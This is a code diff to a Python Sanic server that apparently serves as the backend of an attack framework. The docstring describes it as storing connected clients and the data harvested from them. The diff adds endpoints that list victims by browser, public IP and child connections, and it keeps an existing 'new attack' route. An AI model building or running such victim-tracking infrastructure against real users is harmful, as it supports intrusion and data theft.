@@ -23,7 +23,7 @@ class Database:
     A database of all connected clients and any data they might have harvested.
     """
     def __init__(self):
-        self.db = None # TinyDB('/path/to/db.json')
+        self.db = None
         self.app = None
         self.socket = None
         self.database = {}
@@ -52,7 +52,7 @@ class Database:
         self.app.add_route(self.status, '/status', methods=["GET"])
 
         self.app.add_route(self.client_exist, "/client/exist/<client>", methods=["GET"])
-        self.app.add_route(self.new_client, "/new/client/<client>", methods=["POST"])
+        self.app.add_route(self.new_client, "/new/client/<client>/<ip>", methods=["POST"])
         self.app.add_route(self.delete_client, "/delete/client/<client>", methods=["POST"])
         self.app.add_route(self.new_attack, "/new/attack/value/<parent>/<child>/<lip>/<lport>", methods=["POST"])
 
@@ -69,6 +69,8 @@ class Database:
 
         self.app.add_route(self.get_json, "/get/json/<client>/<key>", methods=["GET"])
         self.app.add_route(self.get_value, "/get/value/<client>/<key>", methods=["GET"])
+        self.app.add_route(self.get_clients, "/get/clients", methods=["GET"])
+        self.app.add_route(self.get_client, "/get/client/<client>", methods=["GET"])
 
         self.app.add_route(self.pop_value, "/pop/value/<client>/<key>", methods=["POST"])
         self.app.add_route(self.peek_value, "/peek/value/<client>/<key>", methods=["GET"])
@@ -91,8 +93,8 @@ class Database:
         return sanic.response.json(RETURN_OK)
 
     # On first visit / redirect
-    async def new_client(self, request, client):
-        self.db.insert({"id":client})
+    async def new_client(self, request, client, ip):
+        self.db.insert({"id": client, "ip": ip, "father":True})
         return sanic.response.json(RETURN_OK)
 
     async def store_json(self, request, client, key):
@@ -190,6 +192,34 @@ class Database:
         except:
             return None, None
         return (ret, subs)
+
+    async def get_client(self, request, client):
+        entries = self.db.search(Query().id == client)
+        if len(entries) != 1:
+            logger.warning("Unable to find client {}".format(client))
+            return sanic.response.raw(b"", status=404)
+        return sanic.response.json(entries[0])
+
+    async def get_clients(self, request):
+        full = self.db.all()
+        ret = {}
+        for f in full:
+            if "parent" not in f:
+                ret[f["id"]] = {}
+                ret[f["id"]]["childs"] = []
+                ret[f["id"]]["browser"] = f.get("browser", "unknown")
+                ret[f["id"]]["publicip"] = f.get("publicip", "unknown")
+
+        for f in full:
+            if "parent" in f:
+                ins = {
+                    "connected": f.get("connected", "unknown"),
+                    "port": f.get("port", "unknown"),
+                    "ip": f.get("ip", "unknown"),
+                    "id": f.get("id", "unknown")
+                }
+                ret[f["parent"]]["childs"].append(ins)
+        return sanic.response.json(ret)
 
     async def pop_value(self, request, client, key):
         ret, subs = self.get_last_value(client, key)
